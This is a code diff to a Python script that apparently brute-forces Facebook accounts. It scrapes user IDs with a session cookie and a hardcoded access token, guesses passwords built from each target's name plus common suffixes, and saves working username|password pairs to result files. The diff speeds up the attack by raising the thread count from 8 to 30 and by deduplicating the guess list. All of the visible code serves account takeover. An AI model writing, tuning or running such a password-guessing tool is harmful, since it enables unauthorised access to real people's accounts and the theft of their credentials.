@@ -43,7 +43,7 @@ def masuk():
                         pass 
                 return cek["cookie"]
         else:
-                 exit("# cookies wrong")
+                 exit("# cookies invalid")
 def login(username,password):
         global die,check,result,count
         b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
@@ -74,9 +74,9 @@ def login(username,password):
                         f.write(username + '|' + password + '\n')
         else:
                 die += 1
-        for i in list('\ |/-•'):
+        for i in list('\|/-•'):
                         print(f"\r[{i}] life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
-                        time.sleep(0.2)
+                        time.sleep(0.3)
 def getid(url):
         raw = requests.get(url,cookies=kuki).content
         getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
@@ -190,7 +190,7 @@ if __name__ == '__main__':
                 print()
                 expass = input("# extra password : ")
                 print("# result will be saved in results-life.txt and results-check.txt")
-                with ThreadPoolExecutor(max_workers=8) as ex:
+                with ThreadPoolExecutor(max_workers=30) as ex:
                         for user in username:
                                 users = user.split('|')
                                 ss = users[0].split(' ')
@@ -200,9 +200,9 @@ if __name__ == '__main__':
                                                 str(x) + '12345',
                                                 str(x) + '123456',
                                                 str(x) + '12',
-                                                expass
                                                 ]
-                                        for passw in listpass:
+                                        listpass.append(expass)
+                                        for passw in set(listpass):
                         #login(user,'sayang')
                                                 ex.submit(login,(users[1]),(passw))
                 if check != 0 or result != 0:
